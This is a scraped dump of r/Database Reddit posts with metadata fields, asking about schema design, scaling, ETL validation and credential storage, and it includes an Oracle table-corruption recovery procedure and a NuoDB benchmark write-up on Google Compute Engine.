Since I've grouped by eventid I have to do a new select for each eventid to get the list of bands... so I do that, joining shows_bands with bands, and list out the bands... This seems messy, but it has always worked just fine for the website I ran for years... so I've never tried to ""fix"" it.

Maybe it's a perfectly fine way of doing things, but it has always felt wrong, and I've never known what to google to figure out a good alternative solution...",,False,self,t5_2qian,False,,,True,t3_ck2f9,http://www.reddit.com/r/Database/comments/ck2f9/askdb_multiple_relationships_one_query_or_more/,

1250816815.0,5,self.Database,9cmji,Ask Database Reddit: How much information does a consultant Database Architect need before they start the logical design phase?,9,4,5,http://www.reddit.com/r/Database/comments/9cmji/ask_database_reddit_how_much_information_does_a/,"Some background: I've worked as a Web Developer for 7 years now, at a small book distribution company and like to think I have a good grasp of intermediate database design techniques and considerations. We've had a lot of ""issues"" with management regarding the number of new projects that ""must get pushed through"", so close to 100% of the time we do a ramshackle job satisfy short-sighted management deadlines.

Recently, as they have (finally) decided our distribution management tool needs a complete overhaul, they have contracted in so-called ""outside expertise"" to ""turn around"" the company (it all feels very *Office Space*, and I never really thought that it could really be like this, you know, in real-life an' all). So, within the week he'd nailed down a logical database diagram, after talking with the IT manager for a couple hours and briefly taking a look at our current database (which is horrible). I'd asked if he'd taken a look at our Operations Manual (one of the few battles won), and was told in no uncertain terms:

**I don't want to look at the Operations Manual, as I already know what you do - you distribute books - you have orders, consumers and publishers - I'm just going to make a normalised database that everything else can plug in to.

I don't want the database to be structured around the organisation.**

While I understand that sometimes the organisation of operations data before the conceptualisation phase of the DB can lead design to be influenced by said operations data, in this instance we have very thorough visual flow-diagrams for all common tasks that take place at both high and lower levels - extremely intuitive (that was one of the goals of the Operations Manual) and would appear to provide him with considerable input for the design (it's thorough enough for him to do away with 90% of interviews required - not that he is/was planning on interviewing anyone).

My questions: 

1) Given all that, it seems extremely unlikely he can adequately conceptualise the problem at hand without first further investigating the company and its operations. Am I missing something fundamental to the database design process, or am I right in thinking we've just hired someone who, while versed in perhaps some theory, isn't really applying it correctly? A little knowledge is a dangerous thing an' all that.

2) The other concern I have is, from my experience it is simply impossible (and hugely naive) to consider that you can make a ""core"" set of tables, that all other tables can ""plug in to"" (no matter how normalised) without having to make **some** adjustments and changes as time goes on. What are you thoughts on this?

On top of all this management have bought it hook like and sinker, mostly because he's told them he can get the core design done in less than a month. It's worth bearing in mind that he hasn't once spoken with any of the development team as to their requirements and is working ""outside"" the loop as it were.

As the internship comes to an end, the company has given me the opportunity to continue full time as ""DBA Trainee"", but I have chosen to go a few days a week to keep my focus on school. 

The ""problem"" is that they are leaving it me to decide what I would like to do on my days in. Now that I've gotten past the ""I had no idea what DBA's did"" stage, I'm trying to figure out what to do/focus on specifically to become marketable. This company uses all the major RDBMS. My thoughts are to focus on SQL server as a good starting spot, so by the end of the semester maybe I can go for a cert or something along those lines. 

My biggest fear is that I get towards the end of the internship with the realization that I haven't really learned anything besides reading random content. 

What would you guys do in my situation?

So I go to my manager and I state that we need to do verfication counts between source and destination and add constraints to all the fields used in the ETL for data validation purposes.  He then counters that he does not want to open up the ODI ETL process again and that we should only need to check a few fields on the important objects.  He states that we should only need to check a few fields as validation and I should use commonsense to figure it out and we should find exception without using ODI.  I have had little exposeure to the actual data in the fields. I don't know how to how to capture exceptions outside of ODI as a seperate process and only check some of the fields for each object.

I'm currently waiting for some of the commands that I'm using in this guide to complete. I had a developer attempt to add a column to the end of a table with default values that were not null. This caused the existing null columns to take up space and blew the table's size into orbit.

When I attempt to drop that column I'm greeted with ORA-600 and ORA-607 that points to corruption. Running DBV and rman block checking yielded no easy solutions as the corruption was backed up (yay!).

The only solution to this conundrum is to export the partitioned table, truncate the table, and import the data back in. Yes this is simple but I'm bored so I'm posting it:

Let's start with the export:

&gt;exp username/password file=dumpfilename.dmp log=logfilename.log tables=tablewithcorruption

Once you've done that go ahead and login to the database as sysdba and truncate the table. Alternatively you could just login as the user that owns the table but that's no fun. Assuming you're passwordless (note that if you don't have a good FULL backup taken at this time that you should stop and slap yourself for considering the next step):

&gt;sqlplus ""/ as sysdba""

&gt;truncate table schemaname.tablename;

&gt;exit;

Now that the table has been truncated it's time to import from our dump file:

&gt;imp username/password file=dumpfilename.dmp log=logfilename.log tables=tablewithcorruption

If you get buffer errors add buffer=100000 to the import string.",,False,self,t5_2qian,False,,,True,t3_1c0p8x,http://www.reddit.com/r/Database/comments/1c0p8x/oracle_database_112_tablepartition_corruption/,

This will be an event site (less generic than it sounds) and I will expect users to search for items based on various tags/categories, venues, titles, details (maybe), cost, location, etc.

I've used mysql features that would be able to handle all of this, but with fairly small user counts.

Titles &amp; details (maybe) will be partial text searches. Location will be longitude/latitude-based, so that will use inequalities I'm guessing (which I believe is expensive). Categories will be key-based, but may also involve some text searching. Cost will be more complicated and may be the main reason I will need joins. Cost structures are so varied, that I can't figure out how to dedicate a single field or a set of fields in a NoSQL setting. I may have to rethink this if it ends up hamstringing site performance.

My basic question is: what database setup should I do now in the planning phases so I don't screw myself once I start getting the traffic I'm hoping for. Is MySQL adequate? Is there a better way? I'm not afraid of learning what I need to learn. My background is full LAMP stack, but I want to feel reassured that what I'm working on will be flexible enough to handle changes when I end up having to pay someone to optimize what I did initially.

=-=-=-=-=-=-=-=-=-=-=-

I'm building a site which will need to able to handle:
* high user count
* fast searches (ajax probable)
* fast sorts (I'll probably do this client-side)
* many records to search through

I'm trying to minimize joins, so each row will have almost all the information needed to return a result set. I will likely have one join with a primary key although I'm happy to have the row include additional information if this is needed. I may not be able to avoid some of the many to many relationships, but I can always discard duplicates from my searches if that makes the site faster.

I don't have an architecture plan (if that's even what it's called). I would like the solution to be somewhat architecture agnostic for now and then when I get ramped up, I'll add in things like replication and better caching.

I'm very comfortable with MySQL, but that's just to show that I can write well-optimized SQL.

The database (PostgreSQL) we currently have serves data up to a website.  The website is read only, so there are no new records being submitted to the database through the website.  We get new data sometimes daily, sometimes weekly, etc.  We have an ETL process that feeds the same database the website is connected to.  The problem with this design is that when the ETL process is running, it has to rebuild indexes, some of the tables etc.  Obviously, while this is happening, the website does not work like it normally would.  Also, due to this reason, we only ingest new data between 10 PM and 8 AM.  Another issue with this model is that sometimes our data loads fail and are incomplete.

To prevent this issue, I have been thinking of implementing a model where there would be a master and two slaves.  The ETL process would feed the master and the website would be running off one of the slave databases.  After the data is loaded into the master, it would update the other slave database not being used by the website with the latest data.  Then the website would change the switch to point to the updated database.  This same process would happen with every update.  This would separate the ETL process from the website, which means we could process new data immediately and not let load failures affect the operation of the website.  

What I'm wondering is if this is a common model implemented by businesses.  I have been doing a lot of googling and have come up with nothing.

I got the user stuff down but can't seem to figure out the tables that will actually hold the text.

The idea was to have Acts which will contain Chapters which will contain Sections which contain the actual text or pages for the book. 

At first, I created a table that has a ""parentid"" column which makes it easy to find the top-level item (parentid = null will pull all the top-level stuff) and a ""rowposition"" column (such as 1, 2, etc.). So getting the first act requires finding a parentid = null and position = 1. Sounds good so far but getting the first chapter in the first act would require a sub-query in which you'd get the first act's id to use as a parentid for the chapter query. However, doing that three times to get to the first section of the first chapter of the first act seems cumbersome.

I'm not entirely sure how to design my table so that it's easier to get the first section of the first chapter of the first act without having to run 3 sub-queries. I considered just having the lowest level block (section) which will list all of its parents' ids which will then correspond to a taxonomy table with further information about the Chapter or Act but idk.

Hey all, I was hoping you could help me out.  I am in the process of creating an access database which will be deployed over a network with 100+ users.  I'm fully aware how not ideal this situations is.  I'm looking for ways to maximize performance.  Here is what I'm dealing with:

First, the reason for this setup is that this project needs to get done NOW and going through our in-house programmers would mean months of delays for a subpar product.  This means no legit backend DB.

- Front end consists of two forms and multiple controls (textboxes, list boxes, combo boxes).
- Each user has a copy of the front end on their desktop.
- Back end is stored on a network share on a local server onsite.
- All queries are stored procedures on the backend that accept parameters.
- Queries are executed by creating a querydef, filling parameters and executing. (Does this help?)
- Return values are stored in a DAO recordset (what is the best lock type to use?)
- Backend is relational and data types are properly set to minimize storage space.
- Upon opening the database, a DAO connection is created and kept open. (Should I close the connection when not in use and open it each time a query is run?)

Performance is great with the 10 users I currently have, but as this scales up I'm worried about access being access and crapping out.  Does anyone have any ideas as to how I can keep this working with 100+ users?

I should add I'm a decently experienced programmer (C, C++, SQL, .Net, VBA) so I'll be able to grasp most concepts.  Any help would be greatly appreciated.  Thanks!

Edit:  I should add that none of the forms are directly linked to a data source.  All form objects are populated through VBA by placing the recordset data in a multidimensional array, closing the rst, and using the array to populate the form.

I am soliciting for the best place I should google or what I should look into.  I would appreciate any advice.

**Background**

Currently have 300+ excel files in a folder and each excel file is a project.  Weekly, employees need to add a line item to the file to update the project.  The information they enter:

* Employee Name (Select from List)
* Date Entered (Date)
* Date Update Occured (Date)
* Group they belong to (A,B,C,D, or E; select from list)
* Status Update (Joe did this, and this happened,had to fire Joe)

Then, I run a master Excel Macro that queries all of these files and pulls together the status updates based on a date range into a master report I can turn into management.
(Yes, I realized a bit too late how messy this would get, please don't lay into me.)

**New Solution**

I'd like to move this to a database of some kind, but I have no idea where to start.  I am pretty good at 'figuring things out', so if someone can tell me, you should use ""X"", then I can get googling.

**REQUIREMENTS**

* Need something 'free', or that can be implemented at commercial business.
* Minimal implementation is HIGHLY DESIRED as I can't irk company IT department.
* Need to be able enter the same information as described above
* Need to be able to query and create roll-up reports

   * no relationships, very much leans itself toward documents (basically 1 table)
   * geolocation data, so need geos support


Now normally I'd probably just fall back on good old Postgres+PostGIS for this (I use it for pretty much everything)

But I am wondering, is this one of those times that calls for jumping on the bandwagon and using a document store like MongoDB?

It just needs to be as fast and as reliable as possible.

Now I need a view thats something like

this is hopefully a fairly straightforward question for anyone who's familiar with databases and makes use of excel's [pivot table](http://en.wikipedia.org/wiki/Pivot_table) feature. i'm starting to teach myself about relational database theory, and i'm wondering how you would describe the functionality of the excel pivot table implementation in terms of constructing queries on a DB.

my motivation here is twofold:

1. pivot tables are probably the most complex 'general data manipulation method' (that isn't scripting) with which i'm familiar, and i want to leverage this knowledge.

2. for people who work with data using spreadsheets but don't script, pivot tables is pretty much the best thing going... those i've introduced to it are usually utterly blown away at how easy it makes so many common tasks. but explaining it has always been hit or miss for me, i really have to take something specific and do something specific in a show-and-tell type model... which is fine, but i think it would be seriously augmented by a catchy, simple way of describing the 'whole concept'.

such a simple description personally remains aloof despite my clear internal impression of integral simplicity. i'm thinking that this discipline will provide the adequate descriptors.",,False,self,t5_2qian,False,,,True,t3_ht7w3,http://www.reddit.com/r/Database/comments/ht7w3/askdatabase_what_are_excel_pivot_tables_in_terms/,

For those that don't know, this is basically a 64 person single elimination bracket tournament. I have a couple ideas and I'm not sure which is best, hopefully someone can help me out.

I was thinking I would sort of go through the options I thought about and the pros and cons for each option.

The first idea is the simplest to implement but I think it would have *huge* speed issues later on scoring thousands of brackets. A simple table of:

tourny_id, match_id, player_id

This would store 63 rows for every bracket of every tournament and would grow very quickly. Indexing would certainly take care of alot of the headaches but it wouldn't last that long IMO. Scoring would be intensive as well as I couldn't think of any other way besides comparing the results from the master bracket row by row to each submitted bracket. I could score the brackets separately and index the results so they wouldn't have to be calculated every time, but I'm hoping to avoid that even though I'm betting I won't be able to.

The next idea I had was storing everything as a comma separated string. If each player has a unique id the string would just be:

player_id, player_id, player_id, etc...

It would obviously have to be in a specific order. This would make retrieving the data much easier and quicker and I think it would be more efficient as well. PHP is much quicker at doing mathematical comparisons than MySQL. I could explode/split the string and then just compare it to a master array. I think this way makes the most sense to me but it seems very unconventional and since the data wouldn't be normalized it all and reports, scoring, everything else would be harder/impossible to do with SQL.

The next idea is an offshoot of this one where you literally have a table with all the columns as matches in the tourny.

tourny_id, r32_m1_player_id, r32_m2_player_id, etc...

r = round, m = match

The benefits of retrieving and storing the data are similar as the above one and you would have the data much more accessible to SQL commands. It seems this maybe the best way but it seems so cumbersome. The draw back to this is if there is a larger tournament or a different format then I'll need new huge tables for each one. So the above option has that advantage over this one.

Any help is most appreciated. I'd love to hear your thoughts.",,False,self,t5_2qian,False,,,True,t3_efuen,http://www.reddit.com/r/Database/comments/efuen/hey_rdatabase_i_was_wondering_if_you_guys_could/,

thanks for reading and offering up your expertise.

I work for a multifaceted media company with deals with a lot of advertising and client-specific auditing of said advertising.  I've been tasked with a project to assist with photo organizing and data collection from the field.  Our representatives in the field go out and take photos of our client locations and currently send them via email with the necessary metadata (photo location, date, time, etc) included in the body of the email.  The current workflow is messy and cumbersome.  I'd like to change this and utilize a simple database that supports rich media -- maybe something like Filemaker Pro.   Doing so would minimize mistakes and put everything into one central location (instead of a mishmash of emails and word documents).

Does anyone have any reasons why I shouldn't go with FMP?  How well does FMP handle large amounts of data?  Granted, I'm not talking about terabytes of information, just a few thousand photos (estimating 3000 photos per year).  No web front-end is required, but that would be nice to have.

I don't need the heavy lifting capabilities of Oracle, nor do I want to spend thousands on building a solution.  I'm by no means and expert at this stuff and any advice would be greatly appreciated.",,False,self,t5_2qian,False,,,True,t3_dk4h0,http://www.reddit.com/r/Database/comments/dk4h0/hey_databaseit_i_need_your_advice_on_a_rich/,

So far I've tried:

* Excel (I use this to format my data as I want, then open w/ OpenOffice to save as a DBF since Excel no longer does this)
* Systat. Total fail. Shits the bed and crashes every time
* R. Exceeded vector limit.
* Access (Last choice, but I was desperate. Failed as well)

My goal is to simply import the data, explore some values, add headers, and then export to be used in other software.

Any ideas, info, suggestions, etc would be greatly appreciated! Thanks in advance.

**EDIT**: I originally reported the file size as about 90mb. This was an error. The actual ASCII file is about 600mb.

You guys are AWESOME.  ...of course it was indexing..  WTF do I know.  enabled indexing for FarmID, ServerID and SampleDTG = query times down into the single digit.. now takes ~10 sec to render the page.   --**Thank You All** who responded helpfully.

====================================

I'm capturing some server stats ~160 servers, 12 fields no more than 20 char each 1x each minute to a MS_SQL 2k5 server.  I drop all rows older than 45 days.

But still, I find that the simple reports I pull are now taking &gt;30sec to generate.  Waiting 30+ sec for a page to load has taken all of the ""wow"" out of what the page actually shows. --a pretty graph of server usage over time.

  My **Big Idea**: Run a report once a minute that dumps a raw .CSV file or some other table structure to a text file on the web server and have the web page (.ASP) read that on demand vs run a SQL select statement w/ each page load.

  Is there any other way to prepare 'live-ish' reports for quick web-viewing?

**RE-EDIT**
[Sample Graph](http://www.mightypenguin.net/farmwatch001.jpeg)
    CurrentMinute shows (ByServer) Load, CurrentConnections(Active/Disconnected) along with Peak.
    Though not illustrated here, OnMouseOver ToolTip=date/Time &amp; Count of peak.

    SC_TodayOverYesterday shows Aggregate data(entire farm) By 6min increments.

    Last8Days shows a compressed display taken every 30min

    Las45 Peaks shows the daily peak going back 45 days.

    The [Red  data in brackets] has been recently added 'debug' code to show the time taken for each Loop and function. 
    The time to pull the 4x SELECT statements is &lt; 1.2sec each
    The time to iterate the RS is less than a sec each also.  What confounds me is that none of these add up to anything approaching ~30 sec. yet there it is

[Sample Code](http://www.mightypenguin.net/farmwatch.txt)
    I've removed the DB_CONN info.  other than that, this is the code I've managed.


I'm starting to think this is an ASP issue with string concatenation and nothing to do w/ SQL.


**You all**  Have been awesome with  your responses.  Thank you for your time and insights.

users [*id, name, email, pass]

reviews [*id, #games_title, review, reviewer]


I'm wondering how I could set up my database so that a user could ""follow"" a game, or basically associate multiple games with a user. For example, I could follow Half-Life, BioShock, and Starcraft (and subsequently get all of the news about those 3 games through PHP).



Would the only way to achieve this to be creating a follows table? With something like [user_id, game_id] relating to the previous two? My only trouble with that is if a user follows 50 games, that's 50 individual records, and if there were 1 million users...



I currently do the same with reviews but almost feel like I'm missing something as there has to be a more efficient way to design this.

Can I remove all the binlogs except maybe the last 5 or so? If this is okay, how do I accomplish this so that the system cleans up after itself? Is there a best practice in dealing with a mounting number of large binlog files?

Type of File: csv  
Size: 69mb   
Rows: 1.85 Million   
Columns: 6   
What I Need: I need to be able to search the first column for specific keywords/phrases and pull out any entry that contains one of them (or filter any entry that doesn't have those keywords).  
The Problem: No budget, no database software, no data analysis software, and minimal programming experience.   

So at work I have a csv file of around 1.85 million rows and 6 columns. My only two tools for interacting with this file are excel and openoffice. I've also been able to play around with the grep and egrep commands with limited success. I've been tasked with extracting relavent data and I'm pretty lost.  

I don't have very much programming experience but I have used MySQL &amp; SPSS in the past for grad school. The problem is that I have been given a budget of $0 to analyze this data. That means that I can't buy any of the great software I would need. 

I managed to get the data broken down into chunks of 100,000 rows per file but now searching for specific information is going to be a giant hassle.  I also still have the main file with all entries.  


Here is a description of the data:  
Column 1 contains a numerical ID number.  
Column 2 is for company names. These are multi-word, have punctation, commas, etc. This is the column I need to be able to search.  
Column 3 is an address. Unfortunately 3 spaces of blank space are inserted between [123 Road Street] and [Town, ST 123456].  
Column 4 &amp; 5 are ""phone1, phone2"". These columns are combined on entries with only 1 phone number.  
Column 6 is website.  

I want to be able to search every entry in column 1 &amp; 6 for certain keywords and have the whole row entry be thrown into a new csv file. I know you might not have time to help me, but thanks for any help.

Edit: For those of you finding this thread in the future: I could not use any of the below suggestions to fix my problem. That's not because they weren't stellar suggestions, I just didn't have the expertise to implement them. I ended up chunking the data into 100,000 row files and performing function based filtering.

This is the hugest proponent of noSQL over SQL.  The sacrifice of ACID for redundency.

I've brought it up in my previous post that foundationDB seems to have solved this while providing ACID to a noSQL instance but I haven't gotten around to testing it in earnest yet.

I was suggested the option of going the route of newSQL and I'm liking the idea of Tokudb and mongoDB hybrid but the problem is that although mongoDB is fault tolerant mySQL would not be.  I want my RDBMS portion of my architecture to be always on as I'm planning the database to reside on a minimum of 5 different servers at once.

Assuming I can go strictly noSQL and I can keep the speed up I will build up completely there, but my comfortability is to hybrid it as there will be quite a bit of static data which I feel would be better leveraging out of an RDBMS.

Hope this all makes sense, interested in your opinions :)

I should have added - I'm aware of Windows Azure SQL Fault Tolerance but keeping away from traditional SQL I'm curious what my options are.  NewSQL is ideal as the database is going to be huge potentially into the TB.

So I'm in the preliminary stage of planning out the architecture of an application I'm creating but at this point I'm not sure if I want to go completely RDBMS or a mix of RDBMS/NoSQL.  Transactions are important so I need to maintain ACID here.  An issue with noSQL I know, but the future looks promising.

This is where I'm stuck in my planning.

In this application there will be *some* set data, or data that changes very infrequently (think somewhere around a few million times a month on an extremely heavy use situation.  Other data however, I imagine in a very heavy situation to be used anywhere and upwards to a million times an hour (through select/update/delete)

My 2 options are thus - 

Option 1 - already being done by competition.  2 RDBMS to share the load between this data but 1 of the RDBMS is specifically read only for selects and the other RDBMS will be running transactions of upwards of 1 million an hour.

Option 2 - I think I would think it possible to do a RDBMS for the data that isn't changing or being called frequently and then using that to inject into a noSQL database like [foundationDB](http://www.foundationdb.com) which will allow me to maintain ACID in a noSQL instance (this is required, otherwise noSQL is useless).

Option 3, though I don't like it much, is to contain 1 or 2 lightweight RDBMS with a 3rd noSQL instance that can be injected with the data being generated in the other 2 RDBMS allowing me to purge the RDBMS and keep it's size down so performance can be increased.
Does anyone think there may be another option?

Option 2 is where my head is set.  foundationDB allows for ACID my concern at this point would be speed in writing between an RDBMS to noSQL.",,False,self,t5_2qian,False,,,True,t3_1fgwc0,http://www.reddit.com/r/Database/comments/1fgwc0/question_on_which_development_option_to_strike_at/,

I'm looking for a bit of insight from whoever regularly does performance tuning.
Long story short, I have to write an application that (1) Analyzes an Oracle instance that ran for some while already (2) Automatically suggests (or performs) improvement, based on statistics collected.
This would be some sort of central panel that analyzes instance data automatically, and outlines possible problems.

I'm a developer, and not a DBA. I have mid-level knowledge about SQL, but almost no knowledge about performance tuning.
While you might say that what I'm trying to do (with this little knowledge I have) is not a good idea (without an in-depth study), please note I completely agree with you, but time is short, I have no choice, and I'm trying to at least come up with something.

What I'm looking for is a few general directions, in which I should deeper dive into documentation. I'm also looking to understand which tuning points would make sense to be addressed by such an application (preferable, points that are not already addressed easily by a simple select in a stat view, and require a hefty amount of processing, etc).

So when you are trying to do performance tuning, (1) What tasks do you find yourself repetitively doing, that you think could be automated (i.e. I'm trying to trace things from V$SYSSTAT, I'm trying to correlate this data with these other things, etc)., (2) How would a central point presenting aggregated data from the oracle system, would look like for you, that would help you the most, and cut down most on your analysis time ?

Any opinions are welcomed.

Let's say I have version 3 on my local machine and I see we need an update. So I write version 4 but then I find out that someone else already wrote a different version 4 that makes mine redundant. And maybe it turns out that the project is already on version 5 so neither migration will actually have any effect.

I'm hoping to present some technical details about this project, spend a few more weeks working on it, and then make it available for download.  

It's really an interesting design.. It can be used for storing KPI over time, and a couple of other features that make it really useful.

I'm hoping that I'll get a chance to write it up on my blog soon, I'll post some more info as soon as I can write it up.

Basically.. I have TieBack, TieBackRecords and TieBackPop and TieBackNotifyIf.

TieBack - is like a JOB- compare database A to database B.  

TieBackRecords - is like a query- the results are stored in my TieBack repository.. and then I have VIEWS that flatten these results to make it easier to compare two result sets.

TieBackPop - run some SQL, simple command, some interesting functionality, but pretty boring TSQL commands or Batch Files

TieBackNotifyIf - take result A and result B and an expression and if A &lt;&gt; B or A isn't within 5% of B, etc.. then it can send an email or run a batch file (will soon be expanded to include SSIS automation as well).

I'm really hoping to make this my first real open source project.
I don't know anything about OpenSource. I barely know enough about .NET to make this useful.

but this system has become a critical cog at three different companies that I've worked at, and I want to take this system to the next level.

I'm hoping that if I document the heck out of this- that people will give me more ideas on further automation.

Basically, I see SQL Agent as something similiar- but this is more about the data QUALITY and raising alarms when two systems are out of sync.

Long term, I need to build an interface for this.. but for now, I'm just using MS Access to maintain the definitions.  I'm probably going to build this in Classic ASP for now, and then hope to move it to ASP.net. (I haven't lost the training wheels yet and not really confident in my ASP.net).

Observed behavior shows me that the total PGA + SGA never goes over memory_max_target.  The problem is, we are not using shared server at all, so PGA and SGA come out of different pools.  SGA from the shared memory segment allocated at startup and PGA from the system heap.

Since the instance allocates a shared memory segment equal to memory max, and then caps usage of the shared memory to SGA + PGA, the memory in the shared segment equal to the size reserved for the PGA is wasted and can never be used.

Should Automatic Memory Management not be used when you're using only dedicated server connections?

So, I'm writing a database (SQL Server/.NET) and I need to store access credentials to systems, be they servers or external services; either way, I need a way of storing a password encrypted but with the option to decrypt. 

What's generally considered the best way of doing this now? Obviously at some point I'll need to pass in a key, but then you have the questions about where to store the key; with .NET, it'll be in the Web.Config file.

So: write my own encryption wrapper (is Rijndael still preferred? No I do not mean write my own algorithm) and use it in SELECT statements? Wrap the same logic in a stored procedure? The stored procedure would be my preference as it means my system can have no direct SELECT privs over the table, meaning that even if compromised no-one can do a ""SELECT *"". 

Is there anything better than just encrypting a password and storing the bytes? Is there any benefit to any kind of salting or in any way improving it? My worry is that if someone got the key (which is, after all, just a file on a webserver) they then have all my passwords. However, I fear that's probably just the risk I'll have to take.

it's been a while since I designed a database, so I wanted to ask how would you go about structuring. I need to store map data for path-planning. Nothing too complex, it's for a robotic application using SQLite for now. The maps are going to be fairly small in size. Single park to a single city in size with very few restrictions as the robot can navigate all pedestrian accessible paths. The data is going to be nodes with few attributes in one table, and now I am not sure about how to proceed when storing oriented edges connecting these nodes. I came up with two possible solutions, one is to use a single foreign key in second table identifying the starting node and a second column identifying the end-node. This way, I would have to store each path twice to be able to go both from node A to B and from B to A if I need to. The second possibility is to use both nodes A and B as foreign keys and search for the starting node in both columns so I can get all edges emerging from the current node. The edges table probably won't contain anything else except maybe an ID field as everything else needed for navigation is probably going to be computed on the fly from the node data.

I guess I am not sure which would be faster. My inclination is the second alternative to keep things simple, but I have a feeling the search is going to be slowed down this way. While time to load and store the data from an XML file is not an issue as it can be done in advance, the edge searching speed is fairly critical. Or is there some solution that is better than both of these? I stumbled upon an article about this yesterday, but I am completely unable to find it today.

I know that it is not going to affect the system that much on such a small dataset, but I would like to do this properly to keep things as scalable and portable as possible.

Thanks for any advice,
John.

I work at a small research clinic and we recently received a grant to create a database for a specific subset of patients. This database would store all relevant data for patients, all of which have variations of a similar disease. Additionally, a platform for running analysis should be integrated within the database, so that a user can make a variety of queries that are analysed across the database (For example, if a user wants to know how many patients &gt;35 are using drug xyz, and how many of them have been to a physician in the past 3 months). 

Initially, we would like the database to be capable of handling 100 patients, but with scalability to &gt;1000 patients over a two year period. The software should also be easily accessible through off-site computers as well. We are thinking it should be a web-based platform.  

What I am interested in is the cost. I need to come up with a quote for how much everything will cost. Not just to pay the programmers/developers, but what my boss is really interested in is the computer/hardware/network costs. Can anyone help me out with some ballpark figures?

I actually would love to learn programming and if there's a way I can be involved in this I'm going to go for it, but I have very little background and I think this type of work requires someone with serious experience.

1365994333.0,2,self.Database,1cd6cg,First experience: Google Compute Engine,4,2,1,http://www.reddit.com/r/Database/comments/1cd6cg/first_experience_google_compute_engine/,"We at [NuoDB](http://www.nuodb.com) were recently given the opportunity to kick the tires on the Google Compute Engine by our friends over at Google. In order to access the capabilities of GCE we decided to run the same YCSB based benchmark we ran at our General Availability Launch back in January. For those of you who missed it we demonstrated running the YCSB benchmark on a 24 machine cluster running on our private cloud in the NuoDB datacenter. The salient results were 1.7 million transactions per second with sub-millisecond latencies.
Public cloud environments typically mean virtualization, inconsistent network performance and potentially slow or low bandwidth disk access. It just so happens that NuoDB was designed to work well in such harsh environments (we don’t call it a cloud database for nothing). Still, the faster the CPU, network and disk the faster the database can operate (thank you captain obvious!). But before we dig into the numbers lets talk about what its like to run NuoDB in the GCE.
Pretty much everything you’d want to do in the GCE is done with a tool called gcutil. First you authenticate with gcutil auth, and through the magic of OAuth your GMail account is used to generate a password that you can cut &amp; paste into gcutil. Then you can say goodbye to dealing with access control. gcutil remembers who you are and sets up the necessary ssh credentials, so that you can log into any of your instances automatically from that machine. And better yet, when you ssh to an instance you haven’t logged into before, a home directory is created for you automatically with your ssh credentials installed so you can then ssh from that machine into any of your other instances. In some ways GCE is easier to deal with than our private cloud (but don’t tell our sys admin I said that).
Another thing you won’t have to deal with is IP addresses, gcutil knows your instance names so instead of having to go hunting for IP addresses you just do:
gcutil ssh image_name
It’s that easy. The gcutil command does all the things you’d expect: you can add, list, delete things called instances, images, firewalls, networks and disks. For those who like to see real code here’s a snippet of our script to create a NuoDB GCE image:
gcutil addinstance --machine_type=n1-highmem-8 \
 --image=projects/google/global/images/gcel-12-04-v20130225 \
 --service_account_scopes=https://www.googleapis.com/auth/devstorage.full_control

gcutil push nuodb-stage nuodb-1.0.1.linux.x64.deb /tmp/

gcutil ssh nuodb-stage &lt;&lt; EOF 
 sudo apt-get -y install openjdk-7-jre-headless
 sudo dpkg -i /tmp/nuodb-1.0.1.linux.x64.deb
 sudo python /usr/share/imagebundle/image_bundle.py -r / -o /tmp --output_file_name=nuodb-1.0.1.image.tar.gz
 gsutil cp /tmp/nuodb-1.0.1.image.tar.gz gs://nuodb_images/
EOF

gcutil addimage --preferred_kernel=projects/google/global/kernels/gce-v20130225 nuodb-101 gs://nuodb_images/nuodb-1.0.1.image.tar.gz
We’re working on getting a pre-built image public so that last line works for everyone. In the meantime, check out our Developer Download Page for details on how to get the product. Doing an install is really easy!
What this does is create an instance, push (scp under the covers) the NuoDB .deb to it (GCE supports a couple different ubuntu and centos based distros), install the JRE and then install nuodb. Then the image is saved for reuse by bundling the raw disk image and uploading it to Google Storage (this is why there’s that –servce_account_scopes argument to addinstance is there, it allows me to use gsutil in my instance without having to authenticate). For more details see the great gcutil docs.
After getting an image together we staged our benchmark by creating 32 images. The domain has to be formed manually by adding the following lines to instances 2-32 default.properties:
broker = false
agent = nuodb-1
We’re not supposed to talk about unimplemented features but in the future my spidey sense tells me this step will go away, most likely by exploiting the GCE metadata mechanism.
From there we exploited GCE’s shared read only disk feature to get our benchmark deployed to every instance and setup 1 Storage Manager (with two disks attached for atom storage and the journal) and 32 Transaction Engines.
So without further ado we can report that NuoDB and GCE achieved 1.8 million transactions per second using our multi-client YCSB setup on workload b (5% updates) on 32 nodes. Read and update latencies were in the 1 millisecond range. We did not run the test with journaling enabled because we’re still working on getting high IO performance against a GCE virtual disk, but we’ll publish those numbers soon. In the meantime let us know what your database needs are like (workload mix, record sizes, db size, etc), so we can run more benchmarks covering the right use-cases.
These results demonstrate clearly that NuoDB and GCE work very well together and we’re excited about adding further support for GCE in future releases. Let us know if there’s any particular functionality you’d like to see.",,False,self,t5_2qian,False,,,True,t3_1cd6cg,http://www.reddit.com/r/Database/comments/1cd6cg/first_experience_google_compute_engine/,

A list of the animals' length of hospitalization grouped by type of animal
A list of the animals' length of hospitalization grouped by injury status

First of all, I'd like to apologize should this be the wrong sub-reddit to post this. In this should be the case, please point me in the right direction if possible.

Now here is my situation / problem / question. I have never programmed or setup a database in my life. In addition I am someone who best understands things if it shown to me or explained in a step-by-step fashion. That is why reading FAQs and such on this topic has not really helped me.

I am listening to a weekly radio mix show and the track lists for each show are available online. Now these lists are in a simple HTML table. Which means there is no possibility to search through them, e.g. to find out if a particular song was used in more than one show. 

I would like to setup a simple website that allows people to search through these track lists. It is clear to me that I would need to have a database that contains the necessary information such as artists, track name, show date etc. What I don't know is how I have to picture the right setup for this in my mind? My starting pattern is an .xls sheet with points like:

- Artist
- Song title
- (Possible remix)
- Show date
- DJ who mixes the particular show

Now what is the structure that one should use to make this well searchable? One database or many? One huge table or many smaller ones? What information should be in what table and how should they be connected?

Basically: How the hell should this be structured and where should I begin. I am grateful for any help or simplified explanation that can give me a start.

**Edit**

I made an example of the track list of one show. I left out the ""Remix"" segment.

I am considering proposing that we break 1NF in a limited way and would like feedback as to what the costs of doing so are. 

In a double entry accounting system, by definition every well-formed financial transaction is balanced, so it has the same number of debits and credits.  We can model debits and credits as negative and positive amounts respectively.  Enforcing this sort of constraint purely declaratively in the database is not really possible, and it is well short of possible in a normalized setup.

In relational algebra we could define relation L for line items such that:

journal_entry_idGsum(amount) = 0

Additionally, for all practical purposes, the data will be append-only (no update or delete operations) so all we have to worry about really are inserts.

